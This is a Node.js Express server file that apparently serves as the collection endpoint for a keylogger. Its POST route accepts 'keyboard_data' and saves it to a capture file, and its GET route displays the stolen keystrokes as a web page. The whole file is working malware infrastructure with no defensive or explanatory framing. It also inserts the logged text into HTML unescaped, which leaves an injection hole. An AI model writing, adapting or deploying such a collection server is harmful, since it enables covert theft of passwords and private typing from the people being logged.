const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const port = 8080;

// Middleware to parse JSON bodies
app.use(bodyParser.json({ extended: true }));

// Route to handle GET requests to the root URL
app.get("/", (req, res) => {
  try {
    // Read the contents of the keylog file
    const keylogFile = fs.readFileSync("keyboard_capture.txt", {
      encoding: "utf-8",
      flag: "r",
    });
    // Send the contents of the keylog file as an HTML response
    res.send(`<h1>logged data</h1><p>${keylogFile.replace("\n", "<br>")}</p>`);
  } catch {
    // If the file does not exist or cannot be read, send a default message
    res.send("<h1>nothing logged yet</h1>");
  }
});

// Route to handle POST requests to the root URL
app.post("/", (req, res) => {
  // Log the received keyboard data to the console
  console.log(req.body.keyboard_data);
  // Write the received keyboard data to the keylog file
  fs.writeFileSync("keyboard_capture.txt", req.body.keyboard_data);
  // Send a success response
  res.send("successfully set data");
});

// Start the server and listen on the specified port
app.listen(port, () => {
  console.log(`app is listening on port ${port}`);
});